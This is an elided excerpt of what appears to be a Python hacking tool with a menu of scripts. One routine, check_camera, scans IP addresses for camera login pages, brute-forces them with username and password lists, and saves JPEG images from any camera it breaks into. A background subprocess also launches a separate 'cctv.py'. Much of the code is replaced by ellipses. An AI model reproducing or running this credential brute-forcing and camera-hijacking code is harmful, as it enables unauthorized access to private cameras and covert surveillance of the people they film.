...
def mostrar_menu():
    ...
    print(Fore.GREEN + "Choose a script to run:")
...
async def ejecutar_script3():
    ...
    async def check_camera(ip, usernames, passwords, port=80):
        try:
            async with httpx.AsyncClient(timeout=15) as client:
                ...
                if response.status_code == 200:
                    print(Fore.BLUE + f"[+] Login page found at {ip}" + Style.RESET_ALL)
                    ...
                    for username in usernames:
                        for password in passwords:
                            ...
                            if response.status_code == 200 and response.headers.get("Content-Type") == "image/jpeg":
                                ...
                                print(Fore.BLUE + f"[+] Image saved from camera {ip}" + Style.RESET_ALL)
                    ...
                    print(Fore.YELLOW + f"[!] Login page not found at {ip}" + Style.RESET_ALL)
    ...
    # Run the scan_hosts function with the provided value
    await scan_hosts(port)
    
subprocess.Popen(['python', 'cctv.py', '&'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Main loop to display the menu
while True:
    mostrar_menu()
    eleccion = input("Enter the number of the script you want to run: ")
